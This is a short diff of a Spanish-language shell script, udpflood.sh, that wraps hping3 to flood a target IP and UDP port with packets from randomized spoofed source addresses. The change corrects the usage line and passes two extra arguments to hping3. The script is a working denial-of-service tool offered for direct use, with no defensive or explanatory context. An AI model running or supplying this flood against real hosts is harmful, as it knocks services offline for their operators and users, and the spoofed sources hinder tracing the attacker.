@@ -4,7 +4,7 @@
 # Uso: sh udpflood.sh ip_target puerto_target
 echo
 echo UDP Flood con herramienta hping3
-echo "Uso: ./udpflood2.sh IP Puerto_UDP"
+echo "Uso: ./udpflood.sh IP Puerto_UDP"
 echo "Control + C para interrumpir"
 echo 
-hping3 $1 -2 --rand-source -p $2 --flood -d 1440
+hping3 $1 -2 --rand-source -p $2 --flood -d 1440 $3 $4
